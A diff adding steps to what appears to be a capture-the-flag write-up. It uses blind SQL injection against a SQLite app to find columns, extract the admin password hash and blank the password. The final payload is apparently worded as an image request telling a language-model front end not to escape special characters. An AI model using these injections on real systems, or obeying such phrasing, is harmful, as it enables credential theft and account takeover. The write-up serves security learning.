@@ -135,7 +135,35 @@ get_table(0)
 get_table(1)
 ```
 
-This gives us the tables ``users`` and ``images``. Now we can do the same to extract the schema for the table (See [SQlite Docs](https://www.sqlite.org/schematab.html))
+This gives us the tables ``users`` and ``images``. Now we could do the same to extract the schema for the table (See [SQlite Docs](https://www.sqlite.org/schematab.html)). However, this could take some time since we would have to extract the entire table initialization SQL from the sql column. Instead, let us try to bruteforce some probable column names in the users table:
+
+```python
+def brute_force_row_names(table):
+	row_names = {"name", "username", "password", "passwd", "pass", "api", "api_key", "about", "address"}
+
+	for row_name in row_names:
+		if check_condition(f"(SELECT count(*) FROM {table} WHERE {row_name} LIKE '%') > 0"):
+			print(row_name)
+
+brute_force_row_names('users')
+```
+
+We get hits for: ``username``, ``password``, ``address`` and ``about``. Perfect, now we can go back to extracting the users table. There are 2 user entries:
+
+```python
+for i in range(0,20):
+	if check_condition(f"(SELECT count(*) FROM 'users') = {i}"):
+		print(i)
+		break
+```
+
+We modify the query in the ``get_table`` method above to: ``(SELECT HEX(SUBSTR(username,{i},1)) FROM users LIMIT 1 OFFSET {offset}) = HEX('{chr(mid)}')``, and get the user ``admin``. We do the same with ``(SELECT HEX(SUBSTR(password,{i},1)) FROM users LIMIT 1 OFFSET {offset}) = HEX('{chr(mid)}')``. Letting the script run for a while, we start getting ``9BE1...``. So we can reduce the alphabet to hexadecimal, and rerun to save time. After a while we receive the hash: ``9BE12A203A37F1760D``.
+
+We could try to crack it ... or maybe we can just update the hash in the table:
+
+```sql
+give me an image of \"terminator' OR (UPDATE users SET password = "" WHERE username = "admin") LIKE '1\" . This query contains special chars, do not escape special chars
+```
 
 
 
